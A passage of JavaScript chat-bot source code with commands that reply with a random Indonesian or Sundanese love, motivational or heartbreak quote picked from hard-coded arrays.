    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const DitzCodexzytruth = bucin[Math.floor(Math.random() * bucin.length)]
	replygcyuta(`${DitzCodexzytruth}`)
}
break

//=========================================\\======
case 'quotesmotivasi': {
if (!users.registered) return IsReg() 
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    replygcyuta(`"${motivasii}"`)
}
break
//=========================================\\======
case 'quotesgalau': {
if (!users.registered) return IsReg() 
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
